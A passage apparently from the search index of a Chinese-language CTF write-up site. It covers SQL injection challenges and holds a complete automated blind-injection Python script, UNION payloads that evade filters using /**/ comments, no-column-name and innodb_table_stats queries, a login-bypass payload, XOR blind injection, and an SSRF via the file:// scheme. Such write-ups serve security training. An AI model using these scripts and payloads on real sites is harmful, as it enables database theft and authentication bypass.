= 127\n    while letf &lt; right:\n        mid = (letf+right) // 2\n        payload = f\"if(ascii(substr((select(flag)from(flag)),{i},1))&gt;{mid},1,2)\"\n        data = {\"id\":payload} \n        res = requests.post(url=url, data=data).text\n        if \"Hello\" in res:\n            letf = mid + 1\n        else:\n            right = mid\n    if letf != 32:\n        flag += chr(letf)\n        print(flag)\n    else:\n        break\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p> <p>\u8fd9\u91cc\u7559\u4e00\u4efd\u5b8c\u6574\u811a\u672c</p> <pre><code># \u5bfc\u5165\u5e93\nimport requests\n\n# \u8bbe\u5b9a\u73af\u5883URL\uff0c\u7531\u4e8e\u6bcf\u6b21\u5f00\u542f\u73af\u5883\u5f97\u5230\u7684URL\u90fd\u4e0d\u540c\uff0c\u9700\u8981\u4fee\u6539\uff01\nurl = 'http://challenge-bf6bdb333028ed5e.sandbox.ctfhub.com:10800/'\n# \u4f5c\u4e3a\u76f2\u6ce8\u6210\u529f\u7684\u6807\u8bb0\uff0c\u6210\u529f\u9875\u9762\u4f1a\u663e\u793aquery_success\nsuccess_mark = \"query_success\"\n# \u628a\u5b57\u6bcd\u8868\u8f6c\u5316\u6210ascii\u7801\u7684\u5217\u8868\uff0c\u65b9\u4fbf\u4fbf\u5229\uff0c\u9700\u8981\u65f6\u518d\u628aascii\u7801\u901a\u8fc7chr(int)\u8f6c\u5316\u6210\u5b57\u6bcd\nascii_range = range(ord('a'), 1 + ord('z'))\n# flag\u7684\u5b57\u7b26\u8303\u56f4\u5217\u8868\uff0c\u5305\u62ec\u82b1\u62ec\u53f7\u3001a-z\uff0c\u6570\u5b570-9\nstr_range = [123, 125] + list(ascii_range) + list(range(48, 58))\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6570\u636e\u5e93\u540d\u957f\u5ea6\ndef getLengthofDatabase():\n    # \u521d\u59cb\u5316\u5e93\u540d\u957f\u5ea6\u4e3a1\n    i = 1\n    # i\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73af\u5e93\u540d\u957f\u5ea6\n    while True:\n        new_url = url + \"?id=1 and length(database())={}\".format(i)\n        # GET\u8bf7\u6c42\n        r = requests.get(new_url)\n        # \u5982\u679c\u8fd4\u56de\u7684\u9875\u9762\u6709query_success\uff0c\u5373\u76f2\u731c\u6210\u529f\u5373\u8df3\u51fa\u65e0\u9650\u5faa\u73af\n        if success_mark in r.text:\n            # \u8fd4\u56de\u6700\u7ec8\u5e93\u540d\u957f\u5ea6\n            return i\n        # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u5e93\u540d\u957f\u5ea6+1\u63a5\u7740\u5faa\u73af\n        i = i + 1\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6570\u636e\u5e93\u540d\ndef getDatabase(length_of_database):\n    # \u5b9a\u4e49\u5b58\u50a8\u5e93\u540d\u7684\u53d8\u91cf\n    name = \"\"\n    # \u5e93\u540d\u6709\u591a\u957f\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n    for i in range(length_of_database):\n        # \u5207\u7247\uff0c\u5bf9\u6bcf\u4e00\u4e2a\u5b57\u7b26\u4f4d\u904d\u5386\u5b57\u6bcd\u8868\n        # i+1\u662f\u5e93\u540d\u7684\u7b2ci+1\u4e2a\u5b57\u7b26\u4e0b\u6807\uff0cj\u662f\u5b57\u7b26\u53d6\u503ca-z\n        for j in ascii_range:\n            new_url = url + \"?id=1 and substr(database(),{},1)='{}'\".format(i + 1, chr(j))\n            r = requests.get(new_url)\n            if success_mark in r.text:\n                # \u5339\u914d\u5230\u5c31\u52a0\u5230\u5e93\u540d\u53d8\u91cf\u91cc\n                name += chr(j)\n                # \u5f53\u524d\u4e0b\u6807\u5b57\u7b26\u5339\u914d\u6210\u529f\uff0c\u9000\u51fa\u904d\u5386\uff0c\u5bf9\u4e0b\u4e00\u4e2a\u4e0b\u6807\u8fdb\u884c\u904d\u5386\u5b57\u6bcd\u8868\n                break\n    # \u8fd4\u56de\u6700\u7ec8\u7684\u5e93\u540d\n    return name\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u5e93\u7684\u8868\u6570\u91cf\ndef getCountofTables(database):\n    # \u521d\u59cb\u5316\u8868\u6570\u91cf\u4e3a1\n    i = 1\n    # i\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73af\n    while True:\n        new_url = url + \"?id=1 and (select count(*) from information_schema.tables where table_schema='{}')={}\".format(\n            database, i)\n        r = requests.get(new_url)\n        if success_mark in r.text:\n            # \u8fd4\u56de\u6700\u7ec8\u8868\u6570\u91cf\n            return i\n        # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u8868\u6570\u91cf+1\u63a5\u7740\u5faa\u73af\n        i = i + 1\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u5e93\u6240\u6709\u8868\u7684\u8868\u540d\u957f\u5ea6\ndef getLengthListofTables(database, count_of_tables):\n    # \u5b9a\u4e49\u5b58\u50a8\u8868\u540d\u957f\u5ea6\u7684\u5217\u8868\n    # \u4f7f\u7528\u5217\u8868\u662f\u8003\u8651\u8868\u6570\u91cf\u4e0d\u4e3a1\uff0c\u591a\u5f20\u8868\u7684\u60c5\u51b5\n    length_list = []\n    # \u6709\u591a\u5c11\u5f20\u8868\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n    for i in range(count_of_tables):\n        # j\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73af\u8868\u540d\u957f\u5ea6\n        j = 1\n        while True:\n            # i+1\u662f\u7b2ci+1\u5f20\u8868\n            new_url = url + \"?id=1 and length((select table_name from information_schema.tables where table_schema='{}' limit {},1))={}\".format(\n                database, i, j)\n            r = requests.get(new_url)\n            if success_mark in r.text:\n                # \u5339\u914d\u5230\u5c31\u52a0\u5230\u8868\u540d\u957f\u5ea6\u7684\u5217\u8868\n                length_list.append(j)\n                break\n            # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u8868\u540d\u957f\u5ea6+1\u63a5\u7740\u5faa\u73af\n            j = j + 1\n    # \u8fd4\u56de\u6700\u7ec8\u7684\u8868\u540d\u957f\u5ea6\u7684\u5217\u8868\n    return length_list\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u5e93\u6240\u6709\u8868\u7684\u8868\u540d\ndef getTables(database, count_of_tables, length_list):\n    # \u5b9a\u4e49\u5b58\u50a8\u8868\u540d\u7684\u5217\u8868\n    tables = []\n    # \u8868\u6570\u91cf\u6709\u591a\u5c11\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n    for i in range(count_of_tables):\n        # \u5b9a\u4e49\u5b58\u50a8\u8868\u540d\u7684\u53d8\u91cf\n        name = \"\"\n        # \u8868\u540d\u6709\u591a\u957f\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n        # \u8868\u957f\u5ea6\u548c\u8868\u5e8f\u53f7\uff08i\uff09\u4e00\u4e00\u5bf9\u5e94\n        for j in range(length_list[i]):\n            # k\u662f\u5b57\u7b26\u53d6\u503ca-z\n            for k in ascii_range:\n                new_url = url + \"?id=1 and substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)='{}'\".format(\n                    database, i, j + 1, chr(k))\n                r = requests.get(new_url)\n                if success_mark in r.text:\n                    # \u5339\u914d\u5230\u5c31\u52a0\u5230\u8868\u540d\u53d8\u91cf\u91cc\n                    name = name + chr(k)\n                    break\n        # \u6dfb\u52a0\u8868\u540d\u5230\u8868\u540d\u5217\u8868\u91cc\n        tables.append(name)\n    # \u8fd4\u56de\u6700\u7ec8\u7684\u8868\u540d\u5217\u8868\n    return tables\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u8868\u7684\u5217\u6570\u91cf\ndef getCountofColumns(table):\n    # \u521d\u59cb\u5316\u5217\u6570\u91cf\u4e3a1\n    i = 1\n    # i\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73af\n    while True:\n        new_url = url + \"?id=1 and (select count(*) from information_schema.columns where table_name='{}')={}\".format(\n            table, i)\n        r = requests.get(new_url)\n        if success_mark in r.text:\n            # \u8fd4\u56de\u6700\u7ec8\u5217\u6570\u91cf\n            return i\n        # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u5217\u6570\u91cf+1\u63a5\u7740\u5faa\u73af\n        i = i + 1\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u5e93\u6307\u5b9a\u8868\u7684\u6240\u6709\u5217\u7684\u5217\u540d\u957f\u5ea6\ndef getLengthListofColumns(database, table, count_of_column):\n    # \u5b9a\u4e49\u5b58\u50a8\u5217\u540d\u957f\u5ea6\u7684\u53d8\u91cf\n    # \u4f7f\u7528\u5217\u8868\u662f\u8003\u8651\u5217\u6570\u91cf\u4e0d\u4e3a1\uff0c\u591a\u4e2a\u5217\u7684\u60c5\u51b5\n    length_list = []\n    # \u6709\u591a\u5c11\u5217\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n    for i in range(count_of_column):\n        # j\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73af\u5217\u540d\u957f\u5ea6\n        j = 1\n        while True:\n            new_url = url + \"?id=1 and length((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1))={}\".format(\n                database, table, i, j)\n            r = requests.get(new_url)\n            if success_mark in r.text:\n                # \u5339\u914d\u5230\u5c31\u52a0\u5230\u5217\u540d\u957f\u5ea6\u7684\u5217\u8868\n                length_list.append(j)\n                break\n            # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u5217\u540d\u957f\u5ea6+1\u63a5\u7740\u5faa\u73af\n            j = j + 1\n    # \u8fd4\u56de\u6700\u7ec8\u7684\u5217\u540d\u957f\u5ea6\u7684\u5217\u8868\n    return length_list\n\n\n# \u81ea\u5b9a\u4e49\u51fd\u6570\u83b7\u53d6\u6307\u5b9a\u5e93\u6307\u5b9a\u8868\u7684\u6240\u6709\u5217\u540d\ndef getColumns(database, table, count_of_columns, length_list):\n    # \u5b9a\u4e49\u5b58\u50a8\u5217\u540d\u7684\u5217\u8868\n    columns = []\n    # \u5217\u6570\u91cf\u6709\u591a\u5c11\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n    for i in range(count_of_columns):\n        # \u5b9a\u4e49\u5b58\u50a8\u5217\u540d\u7684\u53d8\u91cf\n        name = \"\"\n        # \u5217\u540d\u6709\u591a\u957f\u5c31\u5faa\u73af\u591a\u5c11\u6b21\n        # \u5217\u957f\u5ea6\u548c\u5217\u5e8f\u53f7\uff08i\uff09\u4e00\u4e00\u5bf9\u5e94\n        for j in range(length_list[i]):\n            for k in ascii_range:\n                new_url = url + \"?id=1 and substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1)='{}'\".format(\n                    database, table, i, j + 1, chr(k))\n                r = requests.get(new_url)\n                if success_mark in r.text:\n                    # \u5339\u914d\u5230\u5c31\u52a0\u5230\u5217\u540d\u53d8\u91cf\u91cc\n                    name = name + chr(k)\n                    break\n        # \u6dfb\u52a0\u5217\u540d\u5230\u5217\u540d\u5217\u8868\u91cc\n        columns.append(name)\n    # \u8fd4\u56de\u6700\u7ec8\u7684\u5217\u540d\u5217\u8868\n    return columns\n\n\n# \u5bf9\u6307\u5b9a\u5e93\u6307\u5b9a\u8868\u6307\u5b9a\u5217\u7206\u6570\u636e\uff08flag\uff09\ndef getData(database, table, column, str_list):\n    # \u521d\u59cb\u5316flag\u957f\u5ea6\u4e3a1\n    j = 1\n    # j\u4ece1\u5f00\u59cb\uff0c\u65e0\u9650\u5faa\u73afflag\u957f\u5ea6\n    while True:\n        # flag\u4e2d\u6bcf\u4e00\u4e2a\u5b57\u7b26\u7684\u6240\u6709\u53ef\u80fd\u53d6\u503c\n        for i in str_list:\n            new_url = url + \"?id=1 and substr((select {} from {}.{}),{},1)='{}'\".format(column, database, table, j,\n                                                                                        chr(i))\n            r = requests.get(new_url)\n            # \u5982\u679c\u8fd4\u56de\u7684\u9875\u9762\u6709query_success\uff0c\u5373\u76f2\u731c\u6210\u529f\uff0c\u8df3\u8fc7\u4f59\u4e0b\u7684for\u5faa\u73af\n            if success_mark in r.text:\n                # \u663e\u793aflag\n                print(chr(i), end=\"\")\n                # flag\u7684\u7ec8\u6b62\u6761\u4ef6\uff0c\u5373flag\u7684\u5c3e\u7aef\u53f3\u82b1\u62ec\u53f7\n                if chr(i) == \"}\":\n                    print()\n                    return 1\n                break\n        # \u5982\u679c\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0cflag\u957f\u5ea6+1\u63a5\u7740\u5faa\u73af\n        j = j + 1\n\n\n# --\u4e3b\u51fd\u6570--\nif __name__ == '__main__':\n    # \u7206flag\u7684\u64cd\u4f5c\n    # \u8fd8\u6709\u4effsqlmap\u7684UI\u7f8e\u5316\n    print(\"Judging the number of tables in the database...\")\n    database = getDatabase(getLengthofDatabase())\n    count_of_tables = getCountofTables(database)\n    print(\"[+]There are {} tables in this database\".format(count_of_tables))\n    print()\n    print(\"Getting the table name...\")\n    length_list_of_tables = getLengthListofTables(database, count_of_tables)\n    tables = getTables(database, count_of_tables, length_list_of_tables)\n    for i in tables:\n        print(\"[+]{}\".format(i))\n    print(\"The table names in this database are : {}\".format(tables))\n\n    # \u9009\u62e9\u6240\u8981\u67e5\u8be2\u7684\u8868\n    i = input(\"Select the table name:\")\n\n    if i not in tables:\n        print(\"Error!\")\n        exit()\n\n    print()\n    print(\"Getting the column names in the {} table......\".format(i))\n    count_of_columns = getCountofColumns(i)\n    print(\"[+]There are {} tables in the {} table\".format(count_of_columns, i))\n    length_list_of_columns = getLengthListofColumns(database, i, count_of_columns)\n    columns = getColumns(database, i, count_of_columns, length_list_of_columns)\n    print(\"[+]The column(s) name in {} table is:{}\".format(i, columns))\n\n    # \u9009\u62e9\u6240\u8981\u67e5\u8be2\u7684\u5217\n    j = input(\"Select the column name:\")\n\n    if j not in columns:\n        print(\"Error!\")\n        exit()\n\n    print()\n    print(\"Getting the flag......\")\n    print(\"[+]The flag is \", end=\"\")\n    getData(database, i, j, str_range)\n</code></pre>"},{"location":"Web/Chapter8/8-16/","title":"/ ** / \u7ed5\u8fc7\u7a7a\u683c","text":""},{"location":"Web/Chapter8/8-16/#---\u7ed5\u8fc7\u7a7a\u683c","title":"/ ** / \u7ed5\u8fc7\u7a7a\u683c","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u767b\u5f55\u6709\u6ce8\u518c</p> <p></p> <p>\u8bbf\u95ee robots.txt \u53d1\u73b0\u6709\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u4e0b\u6765\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this-&gt;name = $name;\n        $this-&gt;age = (int)$age;\n        $this-&gt;blog = $blog;\n    }\n\n    function get($url)\n    {\n        # \u5148\u521d\u59cb\u5316 cURL \u4f1a\u8bdd\u5e76\u8fd4\u56de\u4e00\u4e2a cURL \u53e5\u67c4\n        $ch = curl_init();\n\n        # \u8bbe\u7f6e cURL \u9009\u9879\uff0c\u6307\u5b9a\u8981\u8bf7\u6c42\u7684 URL\n        curl_setopt($ch, CURLOPT_URL, $url);\n        # 1 \u8868\u793a\u5f00\u542f\u6267\u884c curl_exec() \u65f6\uff0c\u8fd4\u56de\u54cd\u5e94\u5185\u5bb9\u800c\u4e0d\u662f\u76f4\u63a5\u8f93\u51fa\uff0c\u5b58\u5728 SSRF \u6f0f\u6d1e\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this-&gt;get($this-&gt;blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this-&gt;blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n</code></pre> <p>\u56de\u5934\u53bb\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7</p> <p></p> <p>\u770b\u5230\u540d\u5b57\u662f\u84dd\u8272\u7684\uff0c\u70b9\u51fb</p> <p></p> <p>\u6765\u7684\u4e00\u4e2a\u65b0\u9875\u9762\uff0c\u6ce8\u610f URL \u53c2\u6570\u6709\u4e00\u4e2a no</p> <p></p> <p>\u6539\u4e3a 2 \u5c45\u7136\u62a5\u9519\u4e86</p> <p></p> <p>\u52a0\u4e00\u4e2a ' \u62a5\u6570\u636e\u5e93\u7684\u9519\u8bef\uff0c\u90a3\u8fd9\u91cc\u5c31\u5b58\u5728 SQL \u6ce8\u5165</p> <p>\u52a0\u4e86\u5355\u5f15\u53f7\u548c\u53cc\u5f15\u53f7\u90fd\u76f8\u540c\u7684\u9519\u8bef</p> <p></p> <p>\u4e0d\u52a0\u5f15\u53f7\u76f4\u63a5 <code>or 1=1 #</code> \u56de\u663e\u6b63\u5e38</p> <p></p> <p><code>order by 5</code> \u62a5\u9519\uff0c\u518d\u6b21\u6d4b\u8bd5 4 \u6ca1\u6709\u62a5\u9519\uff0c\u8bf4\u660e\u53ea\u6709 4 \u5217</p> <p></p> <p>\u76f4\u63a5 <code>-1 union select 1,2,3,4 #</code>\uff0c\u88ab\u8fc7\u6ee4\u7a7a\u683c\u5e94\u8be5\u662f</p> <p></p> <p>\u4f7f\u7528 /**/ \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7</p> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5e93\u3001\u8868\u3001\u5b57\u6bb5</p> <p></p> <p>\u6700\u540e\u53d1\u73b0 data \u662f\u4e2a\u5e8f\u5217\u5316\u7684\u503c</p> <p></p> <p>\u7ed3\u5408\u4e4b\u524d\u7684\u5907\u4efd\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e blog \u4e3a file \u4f2a\u534f\u8bae\u6765\u8bfb\u53d6 flag \u6587\u4ef6\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\u4f20\u5165\u5230\u7b2c\u56db\u4e2a\u5b57\u6bb5</p> <p></p> <p>\u6784\u9020 payload \u6267\u884c</p> <p></p> <p>\u53f3\u952e\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u6587\u4ef6</p> <p></p> <p>\u6253\u5f00\u518d\u67e5\u770b\u6e90\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter8/8-17/","title":"innodb_table_stats \u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-17/#innodb_table_stats-\u7ed5\u8fc7","title":"innodb_table_stats \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u662f\u4e2a\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u5148\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7</p> <p></p> <p>\u767b\u5f55\u8fdb\u53bb\u6709\u4e00\u4e2a\u7533\u8bf7\u53d1\u5e03\u5e7f\u544a</p> <p></p> <p>\u7533\u8bf7\u5e7f\u544a\u65f6\u6807\u9898\u8f93\u5165 and \u63d0\u793a\u654f\u611f\u8bcd\u6c47</p> <p></p> <p>\u6362\u4e3a ' \u7533\u8bf7\u5e7f\u544a</p> <p></p> <p>\u70b9\u51fb\u5e7f\u544a\u8be6\u60c5</p> <p></p> <p>\u53d1\u73b0\u6709 SQL \u62a5\u9519</p> <p></p> <p>\u8fdb\u884c fuzz \u6d4b\u8bd5\u53d1\u73b0\u4ee5\u4e0b\u88ab\u8fc7\u6ee4</p> <pre><code>\u7a7a\u683c\u88ab\u66ff\u6362\u4e3a\u7a7a\nor\nand\njoin\n--+\n#\nupdatexml\nextractvalue\nexp\nfloor\n...\n</code></pre> <p>order by<code>\u4e0d\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528</code>group by<code>\u6216\u8005</code>into @a, @b, @c, ...</p> <pre><code>'group/**/by/**/23,'\n</code></pre> <p></p> <p>23 \u62a5\u9519\u8bf4\u660e\u53ea\u6709 22\uff0c\u8054\u5408\u67e5\u8be2\u62ff\u6570\u636e\u5e93\u540d</p> <pre><code>'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n</code></pre> <p></p> <p>\u56e0\u4e3a\u8fd9\u91cc\u8fc7\u6ee4 <code>or</code> \u6240\u4ee5\u4e5f\u65e0\u6cd5\u4f7f\u7528 <code>information_schema</code> \u8868\uff0c\u4e5f\u6ca1\u6709 <code>sys</code> \u8868\uff0c\u6240\u4ee5\u4f7f\u7528 <code>mysql.innodb_table_stats</code></p> <pre><code>'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '\n</code></pre> <p></p> <p>\u4f46\u662f\u56e0\u4e3a\u6ca1\u6709\u5b57\u6bb5\u4fe1\u606f\u53ef\u4ee5\u67e5\uff0c\u4f7f\u7528\u65e0\u5217\u540d\u6ce8\u5165\u76f4\u63a5\u67e5\u5185\u5bb9</p> <pre><code>'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-18/","title":"group by \u4ee3\u66ff order by \u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-18/#group-by-\u4ee3\u66ff-order-by-\u7ed5\u8fc7","title":"group by \u4ee3\u66ff order by \u7ed5\u8fc7","text":"<p>\u6253\u5f00\u9875\u9762\u662f\u4e2a\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u5148\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7</p> <p></p> <p>\u767b\u5f55\u8fdb\u53bb\u6709\u4e00\u4e2a\u7533\u8bf7\u53d1\u5e03\u5e7f\u544a</p> <p></p> <p>\u7533\u8bf7\u5e7f\u544a\u65f6\u6807\u9898\u8f93\u5165 and \u63d0\u793a\u654f\u611f\u8bcd\u6c47</p> <p></p> <p>\u6362\u4e3a ' \u7533\u8bf7\u5e7f\u544a</p> <p></p> <p>\u70b9\u51fb\u5e7f\u544a\u8be6\u60c5</p> <p></p> <p>\u53d1\u73b0\u6709 SQL \u62a5\u9519</p> <p></p> <p>\u8fdb\u884c fuzz \u6d4b\u8bd5\u53d1\u73b0\u4ee5\u4e0b\u88ab\u8fc7\u6ee4</p> <pre><code>\u7a7a\u683c\u88ab\u66ff\u6362\u4e3a\u7a7a\nor\nand\njoin\n--+\n#\nupdatexml\nextractvalue\nexp\nfloor\n...\n</code></pre> <p><code>order by</code> \u4e0d\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>group by</code> \u6216\u8005 <code>into @a, @b, @c, ...</code></p> <pre><code>'group/**/by/**/23,'\n</code></pre> <p></p> <p>23 \u62a5\u9519\u8bf4\u660e\u53ea\u6709 22\uff0c\u8054\u5408\u67e5\u8be2\u62ff\u6570\u636e\u5e93\u540d</p> <pre><code>'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-19/","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-19/#\u65e0\u5217\u540d\u6ce8\u5165","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u6253\u5f00\u9875\u9762\u662f\u4e2a\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u5148\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7</p> <p></p> <p>\u767b\u5f55\u8fdb\u53bb\u6709\u4e00\u4e2a\u7533\u8bf7\u53d1\u5e03\u5e7f\u544a</p> <p></p> <p>\u7533\u8bf7\u5e7f\u544a\u65f6\u6807\u9898\u8f93\u5165 and \u63d0\u793a\u654f\u611f\u8bcd\u6c47</p> <p></p> <p>\u6362\u4e3a ' \u7533\u8bf7\u5e7f\u544a</p> <p></p> <p>\u70b9\u51fb\u5e7f\u544a\u8be6\u60c5</p> <p></p> <p>\u53d1\u73b0\u6709 SQL \u62a5\u9519</p> <p></p> <p>\u8fdb\u884c fuzz \u6d4b\u8bd5\u53d1\u73b0\u4ee5\u4e0b\u88ab\u8fc7\u6ee4</p> <pre><code>\u7a7a\u683c\u88ab\u66ff\u6362\u4e3a\u7a7a\nor\nand\njoin\n--+\n#\nupdatexml\nextractvalue\nexp\nfloor\n...\n</code></pre> <p>order by<code>\u4e0d\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528</code>group by<code>\u6216\u8005</code>into @a, @b, @c, ...</p> <pre><code>'group/**/by/**/23,'\n</code></pre> <p></p> <p>23 \u62a5\u9519\u8bf4\u660e\u53ea\u6709 22\uff0c\u8054\u5408\u67e5\u8be2\u62ff\u6570\u636e\u5e93\u540d</p> <pre><code>'union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n</code></pre> <p></p> <p>\u56e0\u4e3a\u8fd9\u91cc\u8fc7\u6ee4 <code>or</code> \u6240\u4ee5\u4e5f\u65e0\u6cd5\u4f7f\u7528 <code>information_schema</code> \u8868\uff0c\u4e5f\u6ca1\u6709 <code>sys</code> \u8868\uff0c\u6240\u4ee5\u4f7f\u7528 <code>mysql.innodb_table_stats</code></p> <pre><code>'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '\n</code></pre> <p></p> <p>\u4f46\u662f\u56e0\u4e3a\u6ca1\u6709\u5b57\u6bb5\u4fe1\u606f\u53ef\u4ee5\u67e5\uff0c\u4f7f\u7528\u65e0\u5217\u540d\u6ce8\u5165\u76f4\u63a5\u67e5\u5185\u5bb9</p> <pre><code>'union/**/select/**/1,(select/**/group_concat(`3`)/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 '\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-2/","title":"\u4e07\u80fd\u5bc6\u7801","text":""},{"location":"Web/Chapter8/8-2/#\u4e07\u80fd\u5bc6\u7801","title":"\u4e07\u80fd\u5bc6\u7801","text":"<p>\u6253\u5f00\u7f51\u9875\u5148\u6d4b\u8bd5\u4e00\u4e0b</p> <p></p> <p>\u6ca1\u6709\u8fc7\u6ee4\u76f4\u63a5\u4e07\u80fd\u5bc6\u7801\u5c31\u80fd\u62ff\u5230</p> <pre><code>1' or 1=1 #\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-20/","title":"\u5f02\u6216\u76f2\u6ce8","text":""},{"location":"Web/Chapter8/8-20/#\u5f02\u6216\u76f2\u6ce8","title":"\u5f02\u6216\u76f2\u6ce8","text":"<p>\u767b\u5f55\u9875\u9762\u5982\u4e0b\uff1a</p> <p></p> <p>\u5bfb\u627e\u6ce8\u5165\u70b9\uff0c\u70b9\u51fb\u795e\u79d8\u4ee3\u7801\u53d1\u73b0\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u4fe1\u606f\uff0c\u7136\u540e\u5c1d\u8bd5 union\u3001and \u7b49\u5173\u952e\u5b57\u53d1\u73b0\u88ab\u5c4f\u853d\uff0c\u5982\u4e0b</p> <p></p> <p>\u5173\u952e\u8bcd\u88ab\u8fc7\u6ee4\u4e86\uff0c\u4f7f\u7528\u4e0d\u4e86\u62a5\u9519\u6ce8\u5165\u3001\u8054\u5408\u6ce8\u5165\u3001bool \u6ce8\u5165</p> <p>\u56e0\u6b64\u60f3\u5230\u4e86\u5f02\u6216\u6ce8\u5165\uff0c\u7ecf\u8fc7\u5c1d\u8bd5\u53d1\u73b0 ^ \u7b26\u53f7\u672a\u88ab\u8fc7\u6ee4</p> <p>\u5f02\u6216\u6ce8\u5165\u539f\u7406</p> <pre><code>'admin' = 0 'admin12' = 0\n'1admin' = 1 '12admin' = 12 'admin' = 0 'admin12' = 0\n'admin1' ^ 1 = 0 ^ 1\n'admin' ^ 1 = 0 ^ 1\n'1admin' ^ 1 = 1 ^ 1\n</code></pre> <pre><code># uname=0 \u65f6\u67e5\u5230\u6240\u6709\u7ed3\u679c\nselect * from plane where uname='roo' ^ 0;\n</code></pre> <p></p> <pre><code># uname=1 \u65f6\u67e5\u4e0d\u5230\u7ed3\u679c\nselect * from plane where uname='roo' ^ 1;\n</code></pre> <p></p> <p></p> 